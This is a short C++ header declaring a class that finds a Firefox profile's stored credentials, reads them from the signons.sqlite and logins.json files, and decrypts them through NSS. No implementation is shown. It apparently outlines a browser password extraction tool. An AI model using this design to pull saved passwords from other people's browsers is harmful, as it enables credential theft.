#pragma once

#include "nss.hxx"
#include "crypt.hxx"
#include <fstream>
#include <nlohmann/json.hpp>
#include <sqlite3.h>

class FFBT : public NSS
{
public:
    // credentials
    int find_credentials(std::filesystem::path profile_path);

    // decryption
    std::vector<std::string> get_sqlite_credentials(std::filesystem::path signons_path);
    std::vector<std::vector<std::string>> get_json_credentials(std::filesystem::path logins_path);
    void decrypt_credentials(std::vector<std::vector<std::string>> encrypted_creds);

    // output
    void output_credentials(); // later
};